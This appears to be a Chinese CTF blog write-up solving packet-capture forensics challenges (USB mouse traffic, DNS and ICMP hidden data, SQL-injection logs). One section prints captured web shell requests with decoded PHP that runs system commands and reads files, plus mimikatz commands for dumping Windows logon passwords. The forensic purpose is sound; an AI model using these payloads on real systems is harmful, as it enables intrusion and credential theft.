<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PK........%j-E8I.......2......flag.pngUT	...|.T*|.Tux...............eP\[.6. 	. ...;A.;..kpm.5......4.&#123;.	....A.k......wj~...N.:u....^.9..Z&#123;......D#B&#123;.........W....-P...3</span><br><span class="line">bb^..r.....~&#125;...O.....x.1...E...7..o..*]uOVV..&#x2F;..a...G.......a#....F.J.|4....C0k...ZS...	..;.#s-.$...+)..(.Qy...M..U..Pe......a..3.....[....Y.zI..U...J&#39;.v......I....M.7.&#125;...OR....e_._......X..........?0.3...k..e.Zb.....q4..</span><br><span class="line">.F:+E.x........	.rH.....H&#x3D;..A.....%...............9..3*S...W.^3...K...s......&#96;..X..G.</span><br><span class="line">......AS....eE..........-.	O.?..%...&amp;...D.rn.....l..</span><br><span class="line">s...[...j.r.Mq.U...+...%H..j[&#96;.....&#x2F;..u..........f.&#123;....Nn.e.\..-.&#125;.R.G.0...&#39;..6![k.*.</span><br><span class="line">...4..J.......nmmqe..3...\.....k....z9qx.CmG7.....;n.....q..,.+?.5..&#x3D;_&gt;......Mx.....s&lt;&#x2F;.o.b.~........zC1....k.t...\.PC~....wj.w.m..]..qZ..l.....&#39;....p..._...0.^..... e..........|qnq&#x3D;.-......</span><br><span class="line">$T&#123;.Z4..6N.L..&lt;&gt;.......</span><br><span class="line">........</span><br><span class="line">.7.s....&amp;F....vq..5....#.P8....B..d.._.,e........+.:.....r......T...\..@@Y...A..;....jrD</span><br><span class="line">)..W.&#x2F;9ie.J.&#x2F;!..PK..........%j-E8I.......2....................flag.pngUT....|.Tux.............PK..........N.........</span><br></pre></td></tr></table></figure>

<p>直接保存原始数据，解压拿到flag。</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201017141158783.png" alt="image-20201017141158783"></p>
<h2 id="SimpleProtocol"><a href="#SimpleProtocol" class="headerlink" title="SimpleProtocol"></a>SimpleProtocol</h2><p>查看了一下，大多是http请求，后来数据包太多了，直接搜索flag，直接就看到flag。</p>
<h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>POST /innerIntf/sorsi.html</p>
<h2 id="Capture-the-Hacker"><a href="#Capture-the-Hacker" class="headerlink" title="Capture the Hacker"></a>Capture the Hacker</h2><p>提示：</p>
<p>这是捕获的黑客攻击数据包，LateRain用户的密码在此次攻击中泄露了，你能找到吗？FLAG格式：SCTF{LateRain的明文密码}。</p>
<p>看了一下大概26个包，第一个包主要是连接shell，可以看到目标是windows系统。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /config.php HTTP/<span class="number">1.1</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">136.0</span><span class="number">.217</span><span class="number">.252</span></span><br><span class="line">Referer: http:<span class="comment">//192.168.30.170</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>)</span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.30</span><span class="number">.170</span></span><br><span class="line">Content-Length: <span class="number">687</span></span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">yo=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%<span class="number">3</span>D%<span class="number">3</span>DHTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Fri, <span class="number">14</span> Nov <span class="number">2014</span> <span class="number">14</span>:<span class="number">47</span>:<span class="number">48</span> GMT</span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span><span class="number">.32</span></span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-Length: <span class="number">147</span></span><br><span class="line"></span><br><span class="line">-&gt;|c:\inetpub\wwwroot	C:	Windows NT ROOT<span class="number">-53</span>DD5427BC <span class="number">5.2</span> build <span class="number">3790</span> (Windows Server <span class="number">2003</span> Enterprise Edition Service Pack <span class="number">2</span>) i586(NETWORK SERVICE)|&lt;-</span><br></pre></td></tr></table></figure>

<p>数据包中大多是一些连接shell之后的操作，比如列目录等等。</p>
<p>其中有一个数据包是打包根目录，具体细节看<code>https://www.cnblogs.com/fetty/p/4769279.html</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST /config.php HTTP/<span class="number">1.1</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">136.0</span><span class="number">.217</span><span class="number">.252</span></span><br><span class="line">Referer: http:<span class="comment">//192.168.30.170</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>)</span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.30</span><span class="number">.170</span></span><br><span class="line">Content-Length: <span class="number">733</span></span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">yo=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%<span class="number">3</span>D&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJkM6XHByb2dyYX4xXFdpblJBUlxyYXIgYSBDOlxJbmV0cHViXHd3d3Jvb3RcYmFja3VwXHd3d3Jvb3QucmFyIEM6XEluZXRwdWJcd3d3cm9vdFxiYWNrdXBcMS5naWYgLWhwSkpCb29tJmVjaG8gW1NdJmNkJmVjaG8gW0VdHTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Fri, <span class="number">14</span> Nov <span class="number">2014</span> <span class="number">14</span>:<span class="number">49</span>:<span class="number">43</span> GMT</span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span><span class="number">.32</span></span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-Length: <span class="number">370</span></span><br><span class="line"></span><br><span class="line">-&gt;|</span><br><span class="line">  </span><br><span class="line">这里就是windows下使用rar命令的情况</span><br><span class="line">RAR <span class="number">5.10</span> beta <span class="number">4</span>    .... (C) <span class="number">1993</span><span class="number">-2014</span> Alexander Roshal    <span class="number">6</span> .... <span class="number">2014</span></span><br><span class="line">........ ........ - <span class="number">3000</span>Yuan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">..................</span><br><span class="line">........ C:\Inetpub\wwwroot\backup\<span class="number">1.</span>gifarchive ?.k?..</span><br><span class="line">.... <span class="number">12</span>%.... <span class="number">25</span>%.... <span class="number">38</span>%.... <span class="number">50</span>%.... <span class="number">63</span>%.... <span class="number">76</span>%.... <span class="number">89</span>%...<span class="number">.100</span>%..... </span><br><span class="line">...... RAR %d.%d .......... </span><br><span class="line">............................ RAR ..............</span><br><span class="line">[S]</span><br><span class="line">c:\inetpub\wwwroot</span><br><span class="line">[E] </span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure>

<p>其中一个数据包是打开rar文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yo&#x3D;%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1&#x3D;C%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5Cbackup%5C%5Cwwwroot.rar</span><br></pre></td></tr></table></figure>

<p>解码查看一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$F&#x3D;get_magic_quotes_gpc()?stripslashes($_POST[&quot;z1&quot;]):$_POST[&quot;z1&quot;];</span><br><span class="line">$fp&#x3D;@fopen($F,&quot;r&quot;);</span><br><span class="line">if(@fgetc($fp))&#123;</span><br><span class="line">@fclose($fp);</span><br><span class="line">@readfile($F);</span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo(&quot;ERROR:&#x2F;&#x2F; Can Not Read&quot;);</span><br><span class="line">&#125;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\inetpub\\wwwroot\\backup\\wwwroot.rar</span><br></pre></td></tr></table></figure>

<p>接下来是打开rar文件，解码查看一下具体命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;&gt;|&quot;);;</span><br><span class="line">$p&#x3D;base64_decode($_POST[&quot;z1&quot;]);</span><br><span class="line">$s&#x3D;base64_decode($_POST[&quot;z2&quot;]);</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">@system($r.&quot; 2&gt;&amp;1&quot;,$ret);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;</span><br><span class="line">ret&#x3D;&#123;$ret&#125;</span><br><span class="line">&quot;:&quot;&quot;;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>

<p>Z2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;d &quot;c:\inetpub\wwwroot\&quot;&amp;C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>

<p>Z1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd  -c cd &#x2F;d &quot;c:\inetpub\wwwroot\&quot;&amp;C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E] 2&gt;&amp;1 </span><br></pre></td></tr></table></figure>

<p>将压缩包提取出来，这里直接使用binwalk但是发现需要密码。JJBoom就是密码打开之后发现有一个1,gif但是大小为9M很可疑。</p>
<p>使用mimikatz破解密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log d:\1.txt      #这一句很关键，将回显输出到一个文件中  </span><br><span class="line">sekurlsa::minidump 1.gif</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<h2 id="slimple"><a href="#slimple" class="headerlink" title="slimple"></a>slimple</h2><p>从 leftover capture data可以看出是鼠标流量。每一个数据包的数据区有四个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移</p>
<p>tshark提取信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;simple.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p>python解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nums &#x3D; []</span><br><span class="line">keys &#x3D; open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;usbdata.txt&#39;,&#39;r&#39;)</span><br><span class="line">keys2 &#x3D; open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.txt&#39;,&#39;w&#39;)</span><br><span class="line">posx &#x3D; 0</span><br><span class="line">posy &#x3D; 0</span><br><span class="line">for line in keys:</span><br><span class="line">    if len(line) !&#x3D; 9 :</span><br><span class="line">         continue</span><br><span class="line">    x &#x3D; int(line[2:4],16)</span><br><span class="line">    y &#x3D; int(line[4:6],16)</span><br><span class="line">    if x &gt; 127 :</span><br><span class="line">        x -&#x3D; 256</span><br><span class="line">    if y &gt; 127 :</span><br><span class="line">        y -&#x3D; 256</span><br><span class="line">    posx +&#x3D; x</span><br><span class="line">    posy +&#x3D; y</span><br><span class="line">    btn_flag &#x3D; int(line[0:2],16)</span><br><span class="line">    if btn_flag &#x3D;&#x3D; 1 :</span><br><span class="line">        print posx , posy</span><br><span class="line">        steady&#x3D;str(posx)+&quot; &quot;+str(posy)</span><br><span class="line">        keys2.write(steady+&quot;\n&quot;)</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>

<p>拿到坐标之后画图，拿到flag。</p>
<h2 id="sqlinject"><a href="#sqlinject" class="headerlink" title="sqlinject"></a>sqlinject</h2><p>提取数数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=open(<span class="string">&quot;/Users/apple/Desktop/access.log&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f1=open(<span class="string">&quot;/Users/apple/Desktop/sql.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    i=urllib.parse.unquote(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag_is_here&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">        f1.write(i)</span><br><span class="line">f1.close()</span><br><span class="line">f.close()</span><br><span class="line">f3=open(<span class="string">&quot;/Users/apple/Desktop/sql.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=open(<span class="string">&quot;/Users/apple/Desktop/sql1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f3.readlines():</span><br><span class="line">    i=re.findall(<span class="string">r&quot;AND ORD([\w|\W]*)&#x27;RCKM&#x27;&quot;</span>,i)</span><br><span class="line">    <span class="keyword">if</span> len(i):</span><br><span class="line">        f2.write(i[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>最后根据sql盲注来判断flag。</p>
<h2 id="2017厦门邀请赛-traffic"><a href="#2017厦门邀请赛-traffic" class="headerlink" title="2017厦门邀请赛 traffic"></a>2017厦门邀请赛 traffic</h2><p>提取ICMP数据包长度，转字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;2.pcapng -T fields -Y &quot;icmp&quot; -e &quot;_ws.col.Length&quot;</span><br></pre></td></tr></table></figure>

<p>或者使用以下方式提取：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;2.pcapng -T fields -Y &quot;icmp&quot; -e &quot;frame.len&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018103640225.png" alt="image-20201018103640225"></p>
<h2 id="2018-红帽杯-Not-only-Wireshark"><a href="#2018-红帽杯-Not-only-Wireshark" class="headerlink" title="2018 红帽杯 Not only Wireshark"></a>2018 红帽杯 Not only Wireshark</h2><p>url比较敏感，提取出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;222.pcapng -T fields -e &quot;http.request.uri&quot; | grep &quot;&#x2F;sqli&#x2F;&quot; &gt; url.txt</span><br></pre></td></tr></table></figure>

<p>经过数据处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=open(<span class="string">&#x27;/Users/apple/Desktop/url.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">	print(i.strip(),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123404B03040A0001080000739C8C4B7B36E495200000001400000004000000666C616781CD460EB62015168D9E64B06FC1712365FDE5F987916DD8A52416E83FDE98FB504B01023F000A0001080000739C8C4B7B36E4952000000014000000040024000000000000002000000000000000666C61670A00200000000000010018000DB39B543D73D301A1ED91543D73D301F99066543D73D301504B0506000000000100010056000000420000000000</span><br></pre></td></tr></table></figure>

<p>发现像一个压缩包，zip压缩包，修改头得到压缩包。得到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker</span><br><span class="line">&#x2F;xss&#x2F;example4.php?name&#x3D;hacker</span><br><span class="line">&#x2F;xss&#x2F;example4.php?name&#x3D;hacker</span><br><span class="line">&#x2F;&#x2F;这个就是压缩包密码。</span><br><span class="line">&#x2F;xss&#x2F;example4.php?key&#x3D;?id&#x3D;1128%23</span><br><span class="line">&#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker</span><br><span class="line">&#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker</span><br><span class="line">&#x2F;codeexec&#x2F;example1.php?name&#x3D;hacker</span><br></pre></td></tr></table></figure>

<h2 id="TRF06-Forever"><a href="#TRF06-Forever" class="headerlink" title="TRF06 Forever"></a>TRF06 Forever</h2><p>DNS协议，查看一下是否有Type类型为txt的数据包，txt记录可以用来隐藏一些信息。果断没有。在一个藏有flag的就是域名的地方，域名拼接起来可能是某些编码，比如base58编码。</p>
<p>kali-tshark提取一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;output.pcap -T fields -e &quot;dns.resp.name&quot;</span><br></pre></td></tr></table></figure>

<p>数据处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">f = open(<span class="string">&#x27;/Users/apple/Desktop/dns.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">	steady_dns=re.findall(<span class="string">r&quot;(\w*).gzpgs&quot;</span>,i)</span><br><span class="line">	<span class="keyword">if</span> len(steady_dns):</span><br><span class="line">		flag+=<span class="string">&quot;&quot;</span>.join(steady_dns[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>base58解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line">org = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> flag:</span><br><span class="line">    org = org*<span class="number">58</span> + C.index(d)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;%x&quot;</span>%org).decode(<span class="string">&quot;hex&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Fraud"><a href="#Fraud" class="headerlink" title="Fraud"></a>Fraud</h2><p>流量包中有一个图片请求，拿到图片之后是一个1M的图片，尝试常规隐血思路没有结果。后来发现在在<code>tcp</code>报文段中有 6Bit 的状态控制码, 其中有一个状态控制码是URG，叫紧急比特（urgent）, 当 URG＝1 时，表明紧急指针字段有效, 代表该封包为紧急封包。它告诉系统此报文段中有紧急数据，应尽快传送 (相当于高优先级的数据)。</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018204904668.png" alt="image-20201018204904668"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;fraud.pcap -T fields -e &quot;tcp.urgent_pointer&quot;</span><br></pre></td></tr></table></figure>

